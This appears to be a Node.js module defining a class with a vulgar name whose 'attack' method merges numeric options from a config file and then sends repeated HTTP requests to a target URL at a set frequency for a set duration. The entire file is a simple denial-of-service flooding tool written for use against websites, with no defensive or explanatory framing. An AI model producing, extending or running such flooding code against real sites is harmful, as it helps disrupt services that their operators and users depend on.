// ---------------------------- Imports. ---------------------------------
const fs      = require('fs'),
      cp      = require('child_process'),
      request = require('request')

// --------------------------- Main class. -------------------------------
class Pizdos {
    // Public.
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {Object} options 
     */
    static attack(url, options) {
        fs.readFile(__dirname + '/../config/standart-options.json',
                    'utf8',
                    (error, data) => {
            if (error) throw error
            
            for (parameter in options) {
                if (isNaN(Number(options[parameter]))) {
                    throw `Parameter ${parameter} is incorrect.`
                }
            }

            this.startAttack(url, Object.assign(JSON.parse(data), options))
        })
    }

    // Private.
    /**
     * Starts attack on url.
     * @param {string} url
     * @param {Object} options
     */
    static startAttack(url, options) {
        console.log('Attack is started.')

        setInterval(() => {
            request(url, (error) => {
                if (error) throw 'Attack ended with an error.\n' + error
            })
        }, options.frequency)

        setTimeout(() => {
            console.log('Attack is complete.')
            process.exit(0)
        }, options.duration)
    }
}

// ---------------------------- Exports. ---------------------------------
module.exports = Pizdos